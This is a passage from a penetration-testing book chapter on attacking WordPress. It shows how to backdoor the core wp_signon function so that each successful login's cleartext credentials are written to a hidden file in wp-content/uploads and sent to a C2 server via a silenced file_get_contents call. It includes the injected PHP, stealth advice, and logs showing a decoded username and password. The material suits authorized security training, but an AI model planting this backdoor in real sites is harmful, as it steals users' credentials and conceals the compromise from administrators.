as they're entered, provided the transmission is not blocked, of course. Storing the data locally would not trip up any network monitors but if server administrators look closely at the application file system, extra files on the server may raise some eyebrows.</p><p>Within the <code class="literal">wp_signon</code> function, credentials are either passed in through the <code class="literal">$credentials</code> variable or for new logins, through the PHP global <code class="literal">$_POST</code> variable. We can JSON-encode this incoming value, Base64-encode the results, and either write them to disk or send them over the wire. The double encoding is mostly for network transmission simplicity's sake and it also slightly obfuscates the data we are exfiltrating.</p><p>PHP provides two handy functions we can inject into the <code class="literal">wp_signon</code> function to exfiltrate the WordPress credentials quickly and easily.</p><p>
+<code class="literal">file_put_contents()</code> allows us to write to disk, anywhere the web user has access to write to. For WordPress specifically, since it allows the upload of data, <code class="literal">wp-content/uploads</code> is usually writeable by the webserver. Other CMSs will have similar access to other directories that we can use.</p><div class="informalexample"><pre class="programlisting">file_put_contents(<span class="strong"><strong>[file to write to]</strong></span>, <span class="strong"><strong>[data to write]</strong></span>, <span class="strong"><strong>FILE_APPEND</strong></span>);</pre></div><p>PHP's <code class="literal">file_get_contents()</code> function allows us to make web requests to our C2 server and we can pass in the <a id="id668" class="indexterm"/>credentials via the URL. We'll be able to see the data in the C2 logs. For network exfiltration, we should prepend the function with the <code class="literal">@</code> character, so that PHP suppresses any errors, should there be any network issues. If the C2 goes down or is otherwise unreachable, we don't want to alert users of a potential security issue.</p><div class="informalexample"><pre class="programlisting">@file_get_contents(<span class="strong"><strong>[c2 URL]</strong></span>);</pre></div><p>It should be noted that URL exfiltration could introduce noticeable delays in the site, which could alert users of a potential compromise. If stealth is paramount, it may be better to store the data locally, retrieve it through the web, and delete it after the engagement is over.</p><p>For our credential stealer, we can use either one (or both) of the following lines of code:</p><div class="informalexample"><pre class="programlisting">file_put_contents(<span class="strong"><strong>'wp-content/uploads/.index.php.swp'</strong></span>, base64_encode(json_encode(<span class="strong"><strong>$_POST</strong></span>)) . PHP_EOL, FILE_APPEND);
+@file_get_contents(<span class="strong"><strong>'http://pingback.c2.spider.ml/ping.php?id='</strong></span> . base64_encode(json_encode(<span class="strong"><strong>$_POST</strong></span>)));</pre></div><p>To recap, during user login, our backdoor will:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Grab the cleartext credentials stored in the <code class="literal">$_POST</code> global</li><li class="listitem">Encode them in JSON and Base64 for easy transmission and obfuscation</li><li class="listitem">Store them on disk in the <code class="literal">wp-content/uploads/.index.php.swp</code> file</li><li class="listitem">Send them to our C2 via the URL <code class="literal">http://pingback.c2.spider.ml/ping.php</code></li></ol></div><p>The backdoor code will be added just before the <code class="literal">wp_signon</code> function returns. This ensures we only capture valid credentials. The <code class="literal">wp_signon</code> function will return well before our code if the credentials supplied are invalid.</p><p>We have to inject our code in the appropriate spot in <code class="literal">wp-includes/user.php</code>. Credentials are checked by <code class="literal">wp_signon</code> and are considered valid towards the end of the function, before the last <code class="literal">return</code> statement. This is where we need to put our code:</p><div class="informalexample"><pre class="programlisting">&lt;?php
+/**
+ * Core User API
+ *
+ * @package WordPress
+ * @subpackage Users
+ */
+[...]
+
+function wp_signon( $credentials = array(), $secure_cookie = '' ) {
+[...]
+  if ( is_wp_error($user) ) {
+    if ( $user-&gt;get_error_codes() == array('empty_username', 'empty_password') ) {
+      $user = new WP_Error('', '');
+    }
+
+    return $user;
+  }
+
+  <span class="strong"><strong>file_put_contents('wp-content/uploads/.index.php.swp', base64_encode(json_encode($_POST)) . PHP_EOL, FILE_APPEND);</strong></span>
+
+  <span class="strong"><strong>@file_get_contents('http://pingback.c2.spider.ml/ping.php?id=' . base64_encode(json_encode($_POST)));</strong></span>
+  wp_set_auth_cookie($user-&gt;ID, $credentials['remember'], $secure_cookie);
+  /**</pre></div><div class="informalexample"><pre class="programlisting">   * Fires after the user has <span class="strong"><strong>successfully</strong></span> logged in.
+   *
+   * @since 1.5.0
+   *
+   * @param string  $user_login Username.
+   * @param WP_User $user       WP_User object of the logged-in user.
+   */
+  <span class="strong"><strong>do_action( 'wp_login', $user-&gt;user_login, $user );</strong></span>
+  <span class="strong"><strong>return $user;</strong></span>
+}</pre></div><p>Once a user, or two or <a id="id669" class="indexterm"/>three users, successfully login, we can see the plaintext credentials in the <code class="literal">wp-content/uploads/.index.php.swp</code> file:</p><div class="informalexample"><pre class="programlisting">root@kali:~# curl http://cookingwithfire.local/wp-content/uploads/.index.php.swp
+<span class="strong"><strong>eyJsb2ciOiJtc21pdGgiLCJwd2QiOiJpWVFOKWUjYTRzKnJMZTdaaFdoZlMmXnYiLCJ3cC1zdWJtaXQiOiJMb2cgSW4iLCJyZWRpcmVjdF90byI6Imh0dHA6XC9cL2Nvb2tpbmd3aXRoZmlyZS5sb2NhbFwvd3AtYWRtaW5cLyIsInRlc3Rjb29raWUiOiIxIn0=</strong></span>
+root@kali:~#</pre></div><p>The C2 has also recorded the same credentials in the connection log:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/c2# php -S 0.0.0.0:80
+PHP 7.0.27-0+deb9u1 Development Server started
+Listening on http://0.0.0.0:80
+Document root is /root/c2
+Press Ctrl-C to quit.
+[] 192.30.89.138:53039 [200]: <span class="strong"><strong>/ping.php?id=eyJsb2ciOiJtc21pdGgiLCJwd2QiOiJpWVFOKWUjYTRzKnJMZTdaaFdoZlMmXnYiLCJ3cC1zdWJtaXQiOiJMb2cgSW4iLCJyZWRpcmVjdF90byI6Imh0dHA6XC9cL2Nvb2tpbmd3aXRoZmlyZS5sb2NhbFwvd3AtYWRtaW5cLyIsInRlc3Rjb29raWUiOiIxIn0=</strong></span>
+</pre></div><p>If we decode the <a id="id670" class="indexterm"/>Base64 data, we can see the password of <code class="literal">msmith</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# curl -s http://cookingwithfire.local/wp-content/uploads/.index.php.swp | base64 -d</strong></span>
+<span class="strong"><strong>{"log":"msmith","pwd":"iYQN)e#a4s*rLe7ZhWhfS&amp;^v","wp-submit":"Log In","redirect_to":"http:\/\/cookingwithfire.local\/wp-admin\/","testcookie":"1"}</strong></span>
+</pre></div><p>Attempting to crack the hash we grabbed from the database would've likely been unsuccessful for <code class="literal">msmith</code>. Thankfully, we were able to modify the CMS code to capture credentials in cleartext, without disrupting the target and its users.</p></div></div>
+<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch12lvl1sec68"/>Summary</h1></div></div></div><p>In this chapter, we took a closer look at attacking CMSs, in particular WordPress. While we did pick on WordPress quite heavily, it's important to note that similar issues and vulnerabilities can be found in its competitors' software as well. Drupal and Joomla usually come up in the CMS conversation and they're no strangers to poorly written plugins or badly configured instances.</p><p>We were able to assess a target CMS using WPScan and Arachni, and even look at options for privilege escalation or lateral movement once some access was obtained. We also looked at backdooring code to persist our access and even modifying the CMS core source files to exfiltrate cleartext credentials to our C2 server.</p></div></body></html>
